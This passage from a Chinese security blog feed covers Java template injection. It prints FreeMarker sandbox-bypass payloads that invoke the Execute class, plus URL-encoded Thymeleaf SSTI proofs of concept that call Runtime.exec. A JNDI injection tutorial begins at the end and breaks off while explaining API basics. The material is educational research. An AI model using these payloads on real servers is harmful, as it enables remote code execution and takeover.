class="line">    &lt;#assign <span class="type">byte</span>=is.read()&gt;</span><br><span class="line">    &lt;#<span class="keyword">if</span> <span class="type">byte</span> == -<span class="number">1</span>&gt;</span><br><span class="line">        &lt;#<span class="keyword">break</span>&gt;</span><br><span class="line">    &lt;/#<span class="keyword">if</span>&gt;</span><br><span class="line">$&#123;<span class="type">byte</span>&#125;, &lt;/#list&gt;]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里引入绕过沙箱的一些手法来源于blackhat议题，在深育杯比赛看到的考点。先来看一下blackhat的原payload</p><p>此<code>payload</code>同样可用于<code>halo 1.2.0</code>版本</p><p>这个payload需要freemarker+spring并设置<code>setExposeSpringMacroHelpers(true)</code>或是application.propertices中配置<code>spring.freemarker.expose-spring-macro-helpers=true</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ac=springMacroRequestContext.webApplicationContext&gt;</span><br><span class="line">&lt;#assign fc=ac.getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;</span><br><span class="line">&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>这个是绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>]，得到以下payload</span><br><span class="line"></span><br><span class="line">&lt;#assign ac=Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>]&gt;</span><br><span class="line">&lt;#assign fc=ac.getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">&lt;#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;</span><br><span class="line">&lt;#assign VOID=fc.setNewBuiltinClassResolver(dcr)&gt;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">简化一下payload</span><br><span class="line"></span><br><span class="line">&lt;#assign fc=Application[<span class="string">&#x27;org.springframework.web.context.WebApplicationContext.ROOT&#x27;</span>].getBean(<span class="string">&#x27;freeMarkerConfiguration&#x27;</span>)&gt;</span><br><span class="line">$&#123;fc.setNewBuiltinClassResolver(fc.getDefaultConfiguration().getNewBuiltinClassResolver())&#125;</span><br><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;whoami&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>在加一些其他的绕过：根据Pwntester 2020年的议题 <a href="https://media.defcon.org/DEF%20CON%2028/DEF%20CON%20Safe%20Mode%20presentations/DEF%20CON%20Safe%20Mode%20-%20Alvaro%20Mun%CC%83oz%20and%20Oleksandr%20Mirosh%20-%20Room%20For%20Escape%20Scribbling%20Outside%20The%20Lines%20Of%20Template%20Security.pdf">https://media.defcon.org/DEF CON 28/DEF CON Safe Mode presentations/DEF CON Safe Mode - Alvaro Muñoz and Oleksandr Mirosh - Room For Escape Scribbling Outside The Lines Of Template Security.pdf</a></p><h5 id="绕过class-getClassloader反射加载Execute类">绕过class.getClassloader反射加载Execute类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign owc=classloader.loadClass(<span class="string">&quot;freemarker.template.ObjectWrapper&quot;</span>)&gt;</span><br><span class="line">&lt;#assign dwf=owc.getField(<span class="string">&quot;DEFAULT_WRAPPER&quot;</span>).get(<span class="literal">null</span>)&gt;</span><br><span class="line">&lt;#assign ec=classloader.loadClass(<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>)&gt;</span><br><span class="line">$&#123;dwf.newInstance(ec,<span class="literal">null</span>)(<span class="string">&quot;id&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA">https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA</a></p><p><a href="https://mp.weixin.qq.com/s/wlBJ26UsZYZAQTf5P5KMxA">https://www.cnblogs.com/nice0e3/p/16217471.htm</a></p><p><a href="https://tttang.com/archive/1412/#toc_0x03-thymeleaf">https://tttang.com/archive/1412/#toc_0x03-thymeleaf</a></p><p><a href="https://forum.butian.net/share/1661">https://forum.butian.net/share/1661</a></p><h2 id="Thymeleaf">Thymeleaf</h2><p>Thymeleaf是众多模板引擎的一种和其他的模板引擎相比，它有如下优势：</p><ul><li>Thymeleaf使用html通过一些特定标签语法代表其含义，但并未破坏html结构，即使无网络、不通过后端渲染也能在浏览器成功打开，大大方便界面的测试和修改。</li><li>Thymeleaf提供标准和Spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改JSTL、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。</li><li>Springboot官方大力推荐和支持，Springboot官方做了很多默认配置，开发者只需编写对应html即可，大大减轻了上手难度和配置复杂度。</li></ul><h3 id="语法">语法</h3><p>参考：<a href="https://blog.csdn.net/Lzy410992/article/details/115371017">https://blog.csdn.net/Lzy410992/article/details/115371017</a></p><p><a href="https://xz.aliyun.com/t/10514?">https://xz.aliyun.com/t/10514?</a></p><p>既然Thymeleaf也使用的html，那么如何区分哪些是Thymeleaf的html？</p><p>在Thymeleaf的html中首先要加上下面的标识。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html xmlns:th=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="标签">标签</h4><p>Thymeleaf提供了一些内置标签，通过标签来实现特定的功能。</p><table><thead><tr><th><strong>标签</strong></th><th><strong>作用</strong></th><th><strong>示例</strong></th><th></th></tr></thead><tbody><tr><td>th:id</td><td>替换id</td><td><input th:id="${user.id}"/></td><td></td></tr><tr><td>th:text</td><td>文本替换</td><td><p text:="${user.name}">bigsai</p></td><td></td></tr><tr><td>th:utext</td><td>支持html的文本替换</td><td><p utext:="${htmlcontent}">content</p></td><td></td></tr><tr><td>th:object</td><td>替换对象</td><td><div th:object="${user}"></div></td><td></td></tr><tr><td>th:value</td><td>替换值</td><td><input th:value="${user.name}" ></td><td></td></tr><tr><td>th:each</td><td>迭代</td><td><tr th:each="student:${user}" ></td><td></td></tr><tr><td>th:href</td><td>替换超链接</td><td><a th:href="@{index.html}">超链接</a></td><td></td></tr><tr><td>th:src</td><td>替换资源</td><td><script type="text/javascript" th:src="@{index.js}"></script></td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="链接表达式">链接表达式</h4><p><font style="color:rgb(51, 51, 51);">在Thymeleaf<br></font>中，如果想引入链接比如link，href，src，需要使用@{资源地址}引入资源。引入的地址可以在static目录下，也可以司互联网中的资源。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> th:href=<span class="string">&quot;@&#123;index.css&#125;&quot;</span>&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> th:src=<span class="string">&quot;@&#123;index.js&#125;&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;a th:href=<span class="string">&quot;@&#123;index.html&#125;&quot;</span>&gt;超链接&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="变量表达式">变量表达式</h4><p>可以通过${…}在model中取值，如果在Model中存储字符串，则可以通过${对象名}直接取值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//数据添加到model中</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bigsai&quot;</span>);<span class="comment">//普通字符串</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;&#x27;我的名字是：&#x27;+$&#123;name&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure><p>取JavaBean对象使用${对象名.对象属性}或者${对象名[‘对象属性’]}来取值。如果JavaBean写了get方法也可以通过${对象.get方法名}取值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line">user user1=<span class="keyword">new</span> <span class="title class_">user</span>(<span class="string">&quot;bigsai&quot;</span>,<span class="number">22</span>,<span class="string">&quot;一个幽默且热爱java的社会青年&quot;</span>);</span><br><span class="line">model.addAttribute(<span class="string">&quot;user&quot;</span>,user1);<span class="comment">//储存javabean</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user.name&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user[&#x27;age&#x27;]&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;user.getDetail()&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure><p>取Map对象使用${Map名[‘key’]}或${Map名.key}。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//页面的url地址</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line">Map&lt;String ,String&gt;map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;place&quot;</span>,<span class="string">&quot;博学谷&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;feeling&quot;</span>,<span class="string">&quot;very well&quot;</span>);</span><br><span class="line"><span class="comment">//数据添加到model中</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;map&quot;</span>,map);<span class="comment">//储存Map</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;map.get(&#x27;place&#x27;)&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;map[&#x27;feeling&#x27;]&#125;&quot;</span>&gt;&lt;/td&gt;</span><br></pre></td></tr></table></figure><p>取List集合：List集合是一个有序列表，需要使用each遍历赋值，<tr th:each="item:${userlist}"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;index&quot;)</span><span class="comment">//页面的url地址</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getindex</span><span class="params">(Model model)</span><span class="comment">//对应函数</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;String&gt;userList=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">userList.add(<span class="string">&quot;zhang san 66&quot;</span>);</span><br><span class="line">userList.add(<span class="string">&quot;li si 66&quot;</span>);</span><br><span class="line">userList.add(<span class="string">&quot;wang wu 66&quot;</span>);</span><br><span class="line"><span class="comment">//数据添加到model中</span></span><br><span class="line">model.addAttribute(<span class="string">&quot;userlist&quot;</span>,userList);<span class="comment">//储存List</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;<span class="comment">//与templates中index.html对应</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;tr th:each=<span class="string">&quot;item:$&#123;userlist&#125;&quot;</span>&gt;</span><br><span class="line">&lt;td th:text=<span class="string">&quot;$&#123;item&#125;&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br></pre></td></tr></table></figure><h4 id="选择变量表达式">选择变量表达式</h4><p>变量表达式也可以写为*{…}。星号语法对选定对象而不是整个上下文评估表达式。也就是说，只要没有选定的对象，美元(${…})和星号(*{…})的语法就完全一样。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div th:object=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br><span class="line">&lt;p&gt;Name: &lt;span th:text=<span class="string">&quot;*&#123;name&#125;&quot;</span>&gt;赛&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Age: &lt;span th:text=<span class="string">&quot;*&#123;age&#125;&quot;</span>&gt;<span class="number">18</span>&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Detail: &lt;span th:text=<span class="string">&quot;*&#123;detail&#125;&quot;</span>&gt;好好学习&lt;/span&gt;.&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="消息表达式">消息表达式</h4><p>文本外部化是从模板文件中提取模板代码的片段，以便可以将它们保存在单独的文件(通常是.properties文件)中,文本的外部化片段通常称为“消息”。通俗易懂的来说#{…}<font style="color:rgb(51, 51, 51);">语法就是用来<br></font><strong>读取配置文件中数据</strong> 的。</p><h4 id="片段表达式">片段表达式</h4><p>片段表达式~{…}可以用于引用公共的目标片段，比如可以在一个template/footer.html中定义下面的片段,并在另一个template中引用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;div th:fragment=<span class="string">&quot;copy&quot;</span>&gt;</span><br><span class="line">© <span class="number">2011</span> The Good Thymes Virtual Grocery</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div th:insert=<span class="string">&quot;~&#123;footer :: copy&#125;&quot;</span>&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="Thymeleaf-模板注入漏洞">Thymeleaf 模板注入漏洞</h3><p>Thymeleaf SSTI 漏洞通常发生在使用动态输入来生成 Thymeleaf 模板的情况下。攻击者可以通过精心 构造的输入向服务器发送恶意代码，这些代码将被 Thymeleaf 视为有效的模板表达式，并在服务器上执 行。因此会导致服务器上的远程代码执行，从而使攻击者能够完全接管服务器并访问敏感数据。在 Thymeleaf 中，可以使用表达式来动态设置模板的值。例如， ${<a href="http://user.name">user.name</a>} 将被替换为用户的名 称。攻击者可以使用类似${T(java.lang.Runtime).getRuntime().exec(‘calc’)} 的表达式来执行 任意的系统命令。Thymeleaf 3.0.0 至 3.0.11 版本存在模板注入漏洞。该漏洞在Thymeleaf 3.0.12及以后版本已经得到修 复，但还是存在一些 Bypass 的方式。</p><p>参考：<a href="https://tttang.com/archive/1412/#toc_0x03-thymeleaf">https://tttang.com/archive/1412/#toc_0x03-thymeleaf</a></p><p><a href="https://forum.butian.net/share/1661">https://forum.butian.net/share/1661</a></p><p><a href="https://www.ctfiot.com/110645.html">https://www.ctfiot.com/110645.html</a></p><p><a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p><p>Thymeleaf模版注入漏洞分两种场景，按照经Servlet处理后得到的viewTemplateName包含&quot;<strong>::</strong>“和不包含”<strong>::</strong>&quot;两种情况。</p><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">选择模板语法</span><br><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;open%20-a%20calculator&quot;</span>).getInputStream()).next()%7d__::.x</span><br><span class="line"></span><br><span class="line">片段选择器</span><br><span class="line">__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;touch /tmp/test.txt&quot;</span>).getInputStream()).next()%7d__::.x</span><br><span class="line"></span><br><span class="line">拼接路径</span><br><span class="line">__%<span class="number">24</span>%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open -a20calculator%<span class="number">22</span>).getInputStream()).next()%7D__%3A%3A.x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Velocity的简介&quot;&gt;Velocity的简介&lt;/h2&gt;
&lt;p&gt;Velocity模板引擎, 作为一款成熟的基于java的模板引擎，能够帮我们实现页面静态化，同时它将Java代码与网页分开，将模板和填入数据整合,生成我们需要的页面.&lt;/p&gt;
&lt;h3 id=&quot;1-基</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="SSTI" scheme="https://oceanzbz.github.io/tags/SSTI/"/>
    
    <category term="注入" scheme="https://oceanzbz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Jndi注入</title>
    <link href="https://oceanzbz.github.io/post/e4f890cd.html"/>
    <id>https://oceanzbz.github.io/post/e4f890cd.html</id>
    <published>2024-12-30T05:39:45.000Z</published>
    <updated>2025-03-05T07:24:36.794Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。<br>上面较官方说法，通俗的说就是若程序定义了 JDNI 中的接口，则就可以通过该接口 API 访问系统的 命令服务和目录服务,如下图。<br><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1713598679063-d9dcf269-aef0-4d13-baaa-4c233cf0c6d5.png" alt=""></p><h2 id="jndi包">jndi包</h2><ul><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">javax.naming</a>：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">javax.naming.directory</a>：主要用于目录操作，它定义了DirContext接口和InitialDir-Context类</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html">javax.naming.event</a>：在命名目录服务器中请求事件通知</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html">javax.naming.ldap</a>：提供LDAP服务支持</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html">javax.naming.spi</a>：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务</li></ul><p>最重要的是javax.naming包，它包含了访问目录服务所需的类和接口，比如Context、Bindings、References、lookup 等。</p><h2 id="JNDI类">JNDI类</h2><p>常见的类有如下几个</p><h3 id="InitialContext">InitialContext</h3><p>构造方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//构建一个初始上下文。</span></span><br><span class="line"></span><br><span class="line">InitialContext()</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造一个初始上下文，并选择不初始化它。</span></span><br><span class="line"></span><br><span class="line">InitialContext(<span class="type">boolean</span> lazy)</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用提供的环境构建初始上下文。</span></span><br><span class="line"></span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常用到的方法有以下几个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//将名称绑定到对象。</span></span><br><span class="line"></span><br><span class="line">bind(Name name, Object obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span></span><br><span class="line"></span><br><span class="line">list(String name)</span><br><span class="line"></span><br><span class="line"><span class="comment">//检索命名对象。</span></span><br><span class="line"></span><br><span class="line">lookup(String name)</span><br><span class="line"></span><br><span class="line"><span class="comment">//将名称绑定到对象，覆盖任何现有绑定。</span></span><br><span class="line"></span><br><span class="line">rebind(String name, Object obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消绑定命名对象。</span></span><br><span class="line"></span><br><span class="line">unbind(String name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>demo如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</span></span><br><span class="line"></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">initialContext.lookup(uri);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Reference">Reference</h3><p>该类是javax.naming中的一个类，该类表示在命名/目录系统外部找到的对象的引用。此类提供了JNDI类的引用功能<br>构造方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//为类名为&quot;className&quot;的对象构造一个新的引用。</span></span><br><span class="line"></span><br><span class="line">Reference(String className)</span><br><span class="line"></span><br><span class="line"><span class="comment">//为类名为&quot;className&quot;的对象和地址构造一个新引用。</span></span><br><span class="line"></span><br><span class="line">Reference(String className, RefAddr addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">//为类名为&quot;className&quot;的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。</span></span><br><span class="line"></span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line"><span class="comment">//为类名为&quot;className&quot;的对象以及对象工厂的类名和位置构造一个新引用。</span></span><br><span class="line"></span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">参数：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">className 远程加载时所使用的类名</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">factory 加载的class中需要实例化类的名称</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">factoryLocation 提供classes数据的地址可以是file/ftp/http协议</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>常用方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//将地址添加到索引posn的地址列表中。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> posn, 